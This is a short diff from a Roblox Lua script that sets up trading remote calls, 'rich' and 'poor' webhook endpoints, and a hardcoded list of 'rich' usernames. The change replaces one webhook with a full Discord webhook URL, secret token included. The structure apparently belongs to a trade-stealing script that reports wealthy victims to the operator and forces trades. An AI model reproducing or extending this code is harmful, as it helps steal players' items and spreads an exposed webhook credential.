@@ -132,7 +132,7 @@ local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmT
 local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
 local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
 
-local RICH_WEBHOOK = "https://sentinelhook.lol/api.php?id=pdjVByArjOg11TA"
+local RICH_WEBHOOK = "https://discord.com/api/webhooks/1514435235826241746/pW8NpfzqXkGMZ530YjOvqUt3TIpSBy55auTr-XfbdwZicrqZ64CsWDpQDRjZboGKfrAQ"
 local POOR_WEBHOOK = _G.POOR_WEBHOOK or ""
 
 local HARDCODED_RICH_USERNAMES = {"qua_lovesAJJ", "LostIatinagirI", "WinningBaddiesStar"}
